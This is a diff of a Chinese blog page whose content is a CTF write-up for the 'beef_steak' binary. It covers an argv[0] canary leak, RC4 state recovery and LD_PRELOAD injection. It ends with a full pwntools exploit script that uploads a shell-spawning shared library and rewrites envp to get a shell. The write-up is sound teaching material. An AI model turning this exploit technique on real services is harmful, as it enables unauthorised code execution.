@@ -143,8 +143,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -166,7 +173,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -246,14 +253,7 @@
 <li>有一个栈溢出，非常短的二进制文件</li>
 </ul>
 <p>开了Stack Canary和NX</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019060501.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019060501.jpg" alt=""></p>
 <h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><p>主要是三个点</p>
 <ol>
 <li>argv[0] leak</li>
@@ -261,88 +261,25 @@
 <li>Shared Library Injection</li>
 </ol>
 <h1 id="初始检查"><a href="#初始检查" class="headerlink" title="初始检查"></a>初始检查</h1><p>直接运行会产生SIGSEGV，似乎缺少能够让它正常运行的东西</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061701.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061702.jpg" alt=""></p>
 <h2 id="用strace确认"><a href="#用strace确认" class="headerlink" title="用strace确认"></a>用strace确认</h2><p>添加env -i以防万一和清除环境变量</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061703.jpg" alt=""></p>
 <p>可以看出需要一个steak用户目录以及flag文件</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061704.jpg" alt=""></p>
 <p>创建对应用户及文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser steak</span><br><span class="line">su steak</span><br><span class="line"><span class="built_in">echo</span> THIS_IS_A_FLAG &gt; /home/steak/flag</span><br></pre></td></tr></table></figure>
 
 <p>之后测试运行，大概就是接收stdin，sleep，结束，这样的流程</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061801.jpg" alt=""></p>
+<h2 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061802.jpg" alt=""></p>
 <ul>
 <li>低位是.text .data .bss等区域，这部分地址是固定的</li>
 <li>高位是library，mapped，vdso，stack之类，程序正常运行必要的东西。如果开启了ASLR，这部分地址会受到影响。gdb运行下ASLR会暂时失效。</li>
 </ul>
-<h1 id="beef-steak解析"><a href="#beef-steak解析" class="headerlink" title="beef_steak解析"></a>beef_steak解析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h1 id="beef-steak解析"><a href="#beef-steak解析" class="headerlink" title="beef_steak解析"></a>beef_steak解析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061803.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061804.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061805.jpg" alt=""></p>
 <p>整个流程大概就是，从flag文件读取内容作为key，对stdin内容进行RC4加密，之后与特定内容进行比较，相等则执行<code>system(&quot;/bin/cat &gt; ./message&quot;);</code>，不相等<code>puts(&quot;I don&#39;t like that!&quot;);</code></p>
 <h2 id="RC4的key是flag"><a href="#RC4的key是flag" class="headerlink" title="RC4的key是flag"></a>RC4的key是flag</h2><ul>
 <li>key最大可能有40字节，理论上无法破解</li>
@@ -356,14 +293,7 @@
 <li>读取了512字节</li>
 <li>但是存在canary</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061806.jpg" alt=""></p>
 <p>这个问题符合argv[0] leak情况</p>
 <ol>
 <li>Stack Canary</li>
@@ -384,206 +314,59 @@
 <li>但是，key最初被KSA使用后立即清零。也就谁说，只有表S可以泄漏</li>
 <li>表S的地址是0x602160</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061807.jpg" alt=""></p>
 <h2 id="泄漏RC4内部表"><a href="#泄漏RC4内部表" class="headerlink" title="泄漏RC4内部表"></a>泄漏RC4内部表</h2><p>使用argv[0] leak泄漏0x602160的内容</p>
 <ul>
 <li>尝试计算出准确距离，精确泄漏</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061808.jpg" alt=""></p>
 <ul>
 <li>在返回之前设置断点，查看状态</li>
 <li>这里设置在0x400CC8，返回之前必定会执行这里</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061809.jpg" alt=""></p>
 <p>正常运行，确认stack状态：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061811.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061810.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061811.jpg" alt=""></p>
 <p>可以计算出输入与argv[0]之间距离为280字节</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061812.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061812.jpg" alt=""></p>
 <p>使用280个”\0” + 0x602160比较好</p>
 <ul>
 <li>使用”\0”而不是”A”，因为RC4_PRGA()中使用了strlen()，这样导致返回0，输入的数据不会经过RC4加密</li>
 <li>因为没有进入循环，没有任何字节被修改，S也不会变化</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061813.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061813.jpg" alt=""></p>
 <p>注意小端序问题，测试运行：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061814.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061814.jpg" alt=""></p>
 <p>实际上，这些就是泄漏出来的表S内容</p>
-<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="argv-0-leak"><a href="#argv-0-leak" class="headerlink" title="argv[0] leak"></a>argv[0] leak</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061815.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="argv-0-leak"><a href="#argv-0-leak" class="headerlink" title="argv[0] leak"></a>argv[0] leak</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061815.jpg" alt=""></p>
 <p>因为RC4状态表会出现一次\x00导致后面内容不显示，所以需要进行一点处理</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061816.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061817.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061816.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061817.jpg" alt=""></p>
 <p>这样我们可以获取到本地测试环境的RC4状态表</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061818.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061818.jpg" alt=""></p>
 <h2 id="RC4解密"><a href="#RC4解密" class="headerlink" title="RC4解密"></a>RC4解密</h2><p>我们已经获得了状态表S，通过S生成伪随机数序列，与密文异或就能够获得明文</p>
 <p>这样我们使用获取的明文作为输入，运行程序，就能够执行system()</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061819.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061820.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061819.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061820.jpg" alt=""></p>
 <h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>这样我们相当于已经可以写入任意内容到文件了，应该也就能够进行Shared Library Injection</p>
 <p>可以按这个流程操作：</p>
 <ol>
 <li>第一次将mylib.so作为message上传</li>
 <li>第二次伪造LD_PRELOAD=./message环境变量</li>
 </ol>
-<h2 id="到envp的距离"><a href="#到envp的距离" class="headerlink" title="到envp的距离"></a>到envp的距离</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061821.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="到envp的距离"><a href="#到envp的距离" class="headerlink" title="到envp的距离"></a>到envp的距离</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061821.jpg" alt=""></p>
 <p>也就是说，我们如果想修改envp[0]，只需要填充296字节</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061822.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061822.jpg" alt=""></p>
 <p>那么字符串LD_PRELOAD=./message应该放在哪呢</p>
 <p>因为RC4的输入是栈上的buffer，输出是全局变量output，全局变量的地址固定，可以使用这个</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061823.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061824.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061823.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061824.jpg" alt=""></p>
 <p>需要注意最初25个字节是strcmp进行比较来判断是否执行system</p>
 <p>整个攻击流程大概是这样：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061825.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061826.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061827.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061825.jpg" alt=""></p>
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061826.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019061827.jpg" alt=""></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://m.blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220642760094&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener">https://m.blog.naver.com/PostView.nhn?blogId=mathboy7&amp;logNo=220642760094&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F</a></p>
 <p>只搜到这一篇writeup，结合以上内容直接看代码吧：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_dec</span><span class="params">(_data)</span>:</span></span><br><span class="line">	data = map(ord, _data)</span><br><span class="line">	state = gstate[::]</span><br><span class="line">	buf = []</span><br><span class="line">	var1 = <span class="number">0</span></span><br><span class="line">	var2 = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data)):</span><br><span class="line">		var2 += <span class="number">1</span></span><br><span class="line">		var2 %= <span class="number">256</span></span><br><span class="line">		var1 += state[var2]</span><br><span class="line">		var1 %= <span class="number">256</span></span><br><span class="line">		tmp = state[var1]</span><br><span class="line">		state[var1] = state[var2]</span><br><span class="line">		state[var2] = tmp</span><br><span class="line">		d = data[i] ^ state[(state[var1] + state[var2]) % <span class="number">256</span>]</span><br><span class="line">		buf.append(d)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="string">''</span>.join(map(chr, buf))</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"localhost"</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">_state = <span class="string">"86041335c74693fcc63ba41192558dfd81eb63d45a17512e8c3ebf6fd162df4030a13fa38b5e140582859737c36d5321fec4cf1aba26873161cae9589a8341c172020164f41b60e20369b68a1eaa4eefe5f8da996c43a54d5da6ac908f3c91f638abfbcdbde05f2a70237d7c591dfacb0680d22d3a49209eb78466334c2750967adbb1a79429f1e6d0579fd90a489c9507540bafe7e4d839a94ff3e1b82f74109df073777e71097925b5281f89ea520c98add7c516f5180f19b388321c4b08f95cd3b00e5bb967342cde6e00eecec0dca845a03dff7675f215edecccc87f4744b465689bf7e856b2dde32bc936d64a122442d5bb0d78bc6b6abe7baea2c28e22"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">gstate = map(ord, _state)</span><br><span class="line">enc = <span class="string">"\x62\x31\xaa\x85\xbd\xbf\x9f\xf3\x8a\x02\x0c\x75\xac\x23\xab\xe4\x82\xc5\x25\x7a\xef\xbd\xc9\x61"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">1024</span>)</span><br><span class="line">r.send(rc4_dec(enc) + <span class="string">"\n"</span>) <span class="comment"># b33fb33feasytodigestb33f</span></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"You may leave a message"</span>)</span><br><span class="line"></span><br><span class="line">lib = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__((constructor)) void init() &#123;</span></span><br><span class="line"><span class="string">	char *f[] = &#123;"/bin/bash", NULL&#125;;</span></span><br><span class="line"><span class="string">	execve("/bin/bash", f, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">open(<span class="string">"lib.c"</span>, <span class="string">"w"</span>).write(lib)</span><br><span class="line">os.system(<span class="string">"gcc -shared -fPIC -o lib.so lib.c"</span>)</span><br><span class="line"></span><br><span class="line">r.send(open(<span class="string">"lib.so"</span>).read())</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"localhost"</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">payload = rc4_dec(enc + <span class="string">"\x00"</span> * <span class="number">8</span> + <span class="string">"LD_PRELOAD=./message\x00"</span>)</span><br><span class="line"><span class="comment"># there is no NULL Byte in payload, but there is in encrypted payload</span></span><br><span class="line">payload += <span class="string">"\x00"</span> * (<span class="number">0x128</span> - (len(payload)))</span><br><span class="line">payload += p64(<span class="number">0x602140</span>)</span><br><span class="line">payload += <span class="string">"\x00"</span> * (<span class="number">512</span> - len(payload))</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">4.1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -596,7 +379,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-06-18T07:58:43.417Z" itemprop="dateUpdated">2019-06-18 15:58:43</time>
+    Last updated: <time datetime="2019-06-18T07:58:43.417Z" itemprop="dateUpdated">2019-06-18 15:58:43</time>
 </span><br>
 
 
@@ -763,11 +546,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
